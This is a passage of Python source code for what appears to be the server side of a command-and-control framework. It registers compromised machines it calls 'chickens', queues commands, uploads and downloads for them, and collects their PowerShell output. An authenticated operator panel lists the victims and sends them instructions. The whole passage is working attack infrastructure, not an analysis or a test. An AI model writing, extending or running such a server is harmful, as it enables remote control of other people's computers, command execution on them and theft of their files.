            data = {'response':"OK"}
        
        elif self.path.startswith('/_control/'):
            if "Token" in self.headers:
                if self.headers['Token'] in allowed_tokens:
                           
                    if henhouse.notifications:
                        data = {"type":"notification","data":henhouse.get_notifications()}
                    else:
                        r_cname = self.path.replace('/_control/', '')
                        for cid in Chicken_list:
                            if r_cname == Chicken_list[cid].cname:
                                _data = Chicken_list[cid].get_data()
                                if _data:
                                    data = _data
                        
                        
        else:
            cid = self.headers['CID']
            cname = self.headers['User-Agent']
            
            if cid not in Chicken_list:
                print("[+] New Chicken spawned:", cname)
                henhouse.set_notification("[+] New Chicken spawned: "+ cname + "\n")
                Chicken_list[cid] = Chicken(cid, cname, self.client_address[0])
                Chicken_list[cid].set_comm({"type":"command","data":Chicken_list[cid].checkin_comm})
            else:
                if Chicken_list[cid].cname != self.headers['User-Agent']:
                    Chicken_list[cid].cname = self.headers['User-Agent']
                data = Chicken_list[cid].get_comm()
                if data:
                    henhouse.set_notification("[i] Sent "+str(len(json.dumps(data)))+" bytes to chicken "+Chicken_list[cid].cname+"\n")
                print(data)
            

        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.end_headers()

        self.wfile.write(json.dumps(data).encode("utf-8"))

    def do_POST(self):
        global command, response

        print("POST", self.path)

        content_length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(content_length).decode("utf-8", errors="replace")
        return_data = {}
        print(data)
        jdata = json.loads(data)
        
        if self.path == '/_login':
            _user = jdata['user']
            _salt = jdata['salt']
            _challenge = jdata['challenge']
            
            return_data = {'response':"Not OK"}
            
            if _user in Creds:
                _md5 = Creds[_user]
                _calc_challenge = hashlib.md5((_md5+_salt).encode()).hexdigest()
                if _calc_challenge == _challenge:
                    _token = random_alpha_string(20)
                    return_data = {'response':"OK",'token':_token}
                    allowed_tokens.append(_token)
        
        elif self.path.startswith('/_control/'):
            if "Token" in self.headers:
                if self.headers['Token'] in allowed_tokens:
                    if (jdata['type'] == 'instruction') and (jdata['data'] == 'list chickens'):
                        return_data = {'type':'list','data':[]}
                        for cid in Chicken_list:
                            chicken = Chicken_list[cid]
                            return_data['data'].append([chicken.cname, chicken.get_elapsed(), chicken.ip, chicken.cid, chicken.checkin_data])
                    else:
                        r_cname = self.path.replace('/_control/', '')

                        for cid in Chicken_list:
                            if r_cname == Chicken_list[cid].cname:
                                if jdata['type'] == 'instruction':
                                    Chicken_list[cid].set_comm(jdata)
                                        
                                elif jdata['type'] == 'download':
                                    Chicken_list[cid].set_comm(jdata)

                                elif jdata['type'] == 'upload':
                                    Chicken_list[cid].set_comm(jdata)
                                    
                                elif jdata['type'] == 'command':
                                    Chicken_list[cid].set_comm(jdata)
                                        
                                elif jdata['type'] == 'command_list':
                                    for _comm in jdata["data"]:
                                        Chicken_list[cid].set_comm(_comm)
        else:
            cid = self.headers['CID']
            if cid in Chicken_list:
                if Chicken_list[cid].cname != self.headers['User-Agent']:
                    Chicken_list[cid].cname = self.headers['User-Agent']
                if jdata['type'] == 'chicken_data':
                    if not Chicken_list[cid].checkin_data:
                        checkin_data = []
                        print('set checkin')
                        for line in jdata['data'].splitlines():
                            if not line.startswith("PS C:\\"):
                                checkin_data.append(line)
                        jdata['data'] = checkin_data[-1]
                        Chicken_list[cid].checkin_data = checkin_data[-1]
                    else:
                        Chicken_list[cid].set_data(jdata)
                        
                elif jdata['type'] == 'upload':
                    Chicken_list[cid].set_data(jdata)
                    
                elif jdata['type'] == 'notification':
                    Chicken_list[cid].set_data(jdata)

        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.end_headers()
        print(return_data)
        self.wfile.write(json.dumps(return_data).encode())


HOST = args.host
PORT = int(args.port)



server = HTTPServer((HOST, PORT), RequestHandler)

if args.certificate and args.privkey:
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=args.certificate, keyfile=args.privkey)

    server.socket = context.wrap_socket(server.socket, server_side=True)

print("[+] Server started",HOST,PORT)

try:
    server.serve_forever()
except KeyboardInterrupt:
    print("\nArresto del server...")
finally:
    server.server_close()
